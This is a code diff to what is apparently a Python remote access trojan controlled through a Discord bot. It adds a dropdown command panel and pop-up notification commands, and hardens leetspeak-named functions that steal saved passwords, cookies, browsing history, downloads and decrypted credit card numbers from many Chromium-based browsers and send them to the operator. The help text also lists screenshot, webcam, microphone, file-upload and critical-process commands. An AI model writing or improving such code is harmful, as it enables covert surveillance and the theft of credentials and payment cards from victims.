@@ -32,6 +32,8 @@ import json
 import pyautogui
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+from win10toast import ToastNotifier
+from discord.ui import View, Select
 
 intents = discord.Intents.all()
 intents.all()
@@ -110,6 +112,42 @@ def control_channel(ctx):
         return False
     else:
         return True
+
+
+def get_clickable_commands():
+    """Return commands that require no arguments for use in the panel."""
+    return [
+        cmd for cmd in bot.commands
+        if len(cmd.clean_params) == 0 and cmd.name not in ("helpme", "panel")
+    ]
+
+
+class CommandMenu(View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        options = [
+            discord.SelectOption(label=c.name, description=c.help or "")
+            for c in get_clickable_commands()
+        ]
+        self.select = Select(placeholder="Run a command...", options=options)
+        self.select.callback = self._run
+        self.add_item(self.select)
+
+    async def _run(self, interaction: discord.Interaction):
+        cmd_name = self.select.values[0]
+        cmd = bot.get_command(cmd_name)
+        if cmd:
+            ctx = await bot.get_context(interaction.message)
+            ctx.author = interaction.user
+            ctx.channel = interaction.channel
+            ctx.guild = interaction.guild
+            ctx.message.content = f"!{cmd_name}"
+            ctx.command = cmd
+            try:
+                await cmd.invoke(ctx)
+            except Exception as e:
+                await interaction.channel.send(f"```Error:\n{e}```")
+        await interaction.response.defer()
     
 @bot.event
 async def on_ready():
@@ -125,7 +163,15 @@ async def on_ready():
         channel = discord.utils.get(guild.channels, name=channel_name)
 
         if channel:
-            await channel.send("""```@everyone !helpme for commands.```""")
+            view = CommandMenu()
+            await channel.send("""@everyone use the dropdown below to run commands.""", view=view)
+
+
+@bot.command(name="panel")
+async def panel(ctx):
+    if control_channel(ctx):
+        view = CommandMenu()
+        await ctx.send("Use the dropdown to run commands.", view=view)
 
 
 @bot.command(name=("ss"))
@@ -433,6 +479,33 @@ async def msg(ctx, *args):
             await ctx.channel.send(f"```Error :\n {e} ``` ")
 
 
+@bot.command(name="notify")
+async def notify(ctx, *args):
+    if control_channel(ctx) == True:
+        message = " ".join(args) or ""
+        try:
+            toaster = ToastNotifier()
+            toaster.show_toast("Notification", message, duration=5, threaded=True)
+        except Exception as e:
+            await ctx.channel.send(f"```Error :\n {e} ``` ")
+
+
+@bot.command(name="notifychoice")
+async def notifychoice(ctx, *args):
+    if control_channel(ctx) == True:
+        question = " ".join(args) or ""
+        try:
+            MB_YESNO = 0x04
+            ICON_QUESTION = 0x20
+            result = ctypes.windll.user32.MessageBoxW(0, question, "Question", MB_YESNO | ICON_QUESTION)
+            if result == 6:
+                await ctx.channel.send("```User clicked Yes```")
+            else:
+                await ctx.channel.send("```User clicked No```")
+        except Exception as e:
+            await ctx.channel.send(f"```Error :\n {e} ``` ")
+
+
 @bot.command(name="amiadmin")
 async def amiadmin(ctx):
     if control_channel(ctx) == True:
@@ -637,20 +710,30 @@ def g34_l0g1n_d474(path: str, profile: str, master_key: bytes, LOGINS):
     login_db = os.path.join(path, profile, 'Login Data')
     if not os.path.exists(login_db):
         return
+    conn = None
+    try:
+        shutil.copy(login_db, 'login_db')
+        conn = sqlite3.connect('login_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
 
-    shutil.copy(login_db, 'login_db')
-    conn = sqlite3.connect('login_db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    for row in cursor.fetchall():
-        if not row[0] or not row[1] or not row[2]:
-            continue
-
-        password = decrypt_password(row[2], master_key)
-        LOGINS.append(f'{row[0]}\t{row[1]}\t{password}')
-
-    conn.close()
-    os.remove('login_db')
+            password = decrypt_password(row[2], master_key)
+            LOGINS.append(f'{row[0]}\t{row[1]}\t{password}')
+    except Exception:
+        pass
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+        if os.path.exists('login_db'):
+            try:
+                os.remove('login_db')
+            except Exception:
+                pass
 
 def g47_c00k13s(path: str, profile: str, master_key: bytes, COOKIES):
     import logging
@@ -690,56 +773,86 @@ def g37_w36_h1570r7(path: str, profile: str, WEB_HISTORY):
     web_history_db = os.path.join(path, profile, 'History')
     if not os.path.exists(web_history_db):
         return
+    conn = None
+    try:
+        shutil.copy(web_history_db, 'web_history_db')
+        conn = sqlite3.connect('web_history_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT url, title, last_visit_time FROM urls')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2]:
+                continue
 
-    shutil.copy(web_history_db, 'web_history_db')
-    conn = sqlite3.connect('web_history_db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT url, title, last_visit_time FROM urls')
-    for row in cursor.fetchall():
-        if not row[0] or not row[1] or not row[2]:
-            continue
-
-        WEB_HISTORY.append(f'{row[0]}\t{row[1]}\t{row[2]}')
-
-    conn.close()
-    os.remove('web_history_db')
+            WEB_HISTORY.append(f'{row[0]}\t{row[1]}\t{row[2]}')
+    except Exception:
+        pass
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+        if os.path.exists('web_history_db'):
+            try:
+                os.remove('web_history_db')
+            except Exception:
+                pass
 
 def g35_40wnl044s(path: str, profile: str, DOWNLOADS):
     downloads_db = os.path.join(path, profile, 'History')
     if not os.path.exists(downloads_db):
         return
+    conn = None
+    try:
+        shutil.copy(downloads_db, 'downloads_db')
+        conn = sqlite3.connect('downloads_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT tab_url, target_path FROM downloads')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1]:
+                continue
 
-    shutil.copy(downloads_db, 'downloads_db')
-    conn = sqlite3.connect('downloads_db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT tab_url, target_path FROM downloads')
-    for row in cursor.fetchall():
-        if not row[0] or not row[1]:
-            continue
-
-        DOWNLOADS.append(f'{row[0]}\t{row[1]}')
-
-    conn.close()
-    os.remove('downloads_db')
+            DOWNLOADS.append(f'{row[0]}\t{row[1]}')
+    except Exception:
+        pass
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+        if os.path.exists('downloads_db'):
+            try:
+                os.remove('downloads_db')
+            except Exception:
+                pass
 
 def g34_3r341t_3434s(path: str, profile: str, master_key: bytes, CARDS):
     cards_db = os.path.join(path, profile, 'Web Data')
     if not os.path.exists(cards_db):
         return
+    conn = None
+    try:
+        shutil.copy(cards_db, 'cards_db')
+        conn = sqlite3.connect('cards_db')
+        cursor = conn.cursor()
+        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+        for row in cursor.fetchall():
+            if not row[0] or not row[1] or not row[2] or not row[3]:
+                continue
 
-    shutil.copy(cards_db, 'cards_db')
-    conn = sqlite3.connect('cards_db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
-    for row in cursor.fetchall():
-        if not row[0] or not row[1] or not row[2] or not row[3]:
-            continue
-
-        card_number = decrypt_password(row[3], master_key)
-        CARDS.append(f'{row[0]}\t{row[1]}\t{row[2]}\t{card_number}\t{row[4]}')
-
-    conn.close()
-    os.remove('cards_db')
+            card_number = decrypt_password(row[3], master_key)
+            CARDS.append(f'{row[0]}\t{row[1]}\t{row[2]}\t{card_number}\t{row[4]}')
+    except Exception:
+        pass
+    finally:
+        try:
+            conn.close()
+        except Exception:
+            pass
+        if os.path.exists('cards_db'):
+            try:
+                os.remove('cards_db')
+            except Exception:
+                pass
 
 def write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS):
     os.makedirs("dinner", exist_ok=True)
@@ -800,60 +913,63 @@ def clean():
 @bot.command(name="passwrd")
 async def passwrd(ctx):
     if control_channel(ctx):
-        LOGINS = []
-        COOKIES = []
-        WEB_HISTORY = []
-        DOWNLOADS = []
-        CARDS = []
-        INFO = []
-        SYSTEM_INFO = []
+        try:
+            LOGINS = []
+            COOKIES = []
+            WEB_HISTORY = []
+            DOWNLOADS = []
+            CARDS = []
+            INFO = []
+            SYSTEM_INFO = []
 
-        g35(INFO)
-        s4st7m(SYSTEM_INFO)
-        st4art7u0()
+            g35(INFO)
+            s4st7m(SYSTEM_INFO)
+            st4art7u0()
 
-        appdata = os.getenv('LOCALAPPDATA')
-        browsers = {
-            'amigo': appdata + '\\Amigo\\User Data',
-            'torch': appdata + '\\Torch\\User Data',
-            'kometa': appdata + '\\Kometa\\User Data',
-            'orbitum': appdata + '\\Orbitum\\User Data',
-            'cent-browser': appdata + '\\CentBrowser\\User Data',
-            '7star': appdata + '\\7Star\\7Star\\User Data',
-            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
-            'vivaldi': appdata + '\\Vivaldi\\User Data',
-            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
-            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
-            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
-            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
-            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
-            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
-            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-            'iridium': appdata + '\\Iridium\\User Data',
-        }
-        profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
+            appdata = os.getenv('LOCALAPPDATA')
+            browsers = {
+                'amigo': appdata + '\\Amigo\\User Data',
+                'torch': appdata + '\\Torch\\User Data',
+                'kometa': appdata + '\\Kometa\\User Data',
+                'orbitum': appdata + '\\Orbitum\\User Data',
+                'cent-browser': appdata + '\\CentBrowser\\User Data',
+                '7star': appdata + '\\7Star\\7Star\\User Data',
+                'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+                'vivaldi': appdata + '\\Vivaldi\\User Data',
+                'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+                'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+                'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+                'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+                'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+                'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+                'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+                'iridium': appdata + '\\Iridium\\User Data',
+            }
+            profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
 
-        for _, path in browsers.items():
-            if not os.path.exists(path):
-                continue
-
-            master_key = get_master_key(os.path.join(path, 'Local State'))
-            if not master_key:
-                continue
-
-            for profile in profiles:
-                if not os.path.exists(os.path.join(path, profile)):
+            for _, path in browsers.items():
+                if not os.path.exists(path):
                     continue
 
-                g34_l0g1n_d474(path, profile, master_key, LOGINS)
-                g37_w36_h1570r7(path, profile, WEB_HISTORY)
-                g35_40wnl044s(path, profile, DOWNLOADS)
-                g47_c00k13s(path, profile, master_key, COOKIES)
-                g34_3r341t_3434s(path, profile, master_key, CARDS)
+                master_key = get_master_key(os.path.join(path, 'Local State'))
+                if not master_key:
+                    continue
 
-        write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS)
-        await send_dinner(ctx)
-        clean()
+                for profile in profiles:
+                    if not os.path.exists(os.path.join(path, profile)):
+                        continue
+
+                    g34_l0g1n_d474(path, profile, master_key, LOGINS)
+                    g37_w36_h1570r7(path, profile, WEB_HISTORY)
+                    g35_40wnl044s(path, profile, DOWNLOADS)
+                    g47_c00k13s(path, profile, master_key, COOKIES)
+                    g34_3r341t_3434s(path, profile, master_key, CARDS)
+
+            write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS)
+            await send_dinner(ctx)
+            clean()
+        except Exception as e:
+            await ctx.send(f"```Error :\n {e} ``` ")
         
 @bot.command(name="session")
 async def session(ctx, *args):
@@ -892,7 +1008,8 @@ async def helpmsg(ctx):
         return
     await ctx.channel.send(r"""```
 !helpme : Shows Commands.
-!screen_record (second) : Record Screen.    
+!panel : Opens a dropdown menu for no-type commands.
+!screen_record (second) : Record Screen.
 !ss (number) : Take Screenshot.
 !recordvoice (second) : Record a Voice File.
 !ws (number) : Webcamshot.
@@ -911,6 +1028,8 @@ async def helpmsg(ctx):
 !shutdown : Closes The PC.
 !restart : Restart The Pc.
 !msg (custom input) : Send a MessageBox.
+!notify (message) : Show a toast notification.
+!notifychoice (question) : Ask with Yes/No and report choice.
 !wallpaper (picture) : Change the Wallpaper.(only png.)
 !critproc : It Make The File has a Critical Process.
 !upload (file) : Upload a File.
@@ -924,6 +1043,8 @@ DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
     example usage : !ss 4 it will take 4 ss for a second.
     example usage : !voice (voice file.)
     example usage : !msg (custom sentences.)
+    example usage : !notify (custom sentences.)
+    example usage : !notifychoice (custom sentences.)
     example usage : !say (custom sentences.)
     example usage : !setlang (lang code.)
     example usage : !get (the file path.)
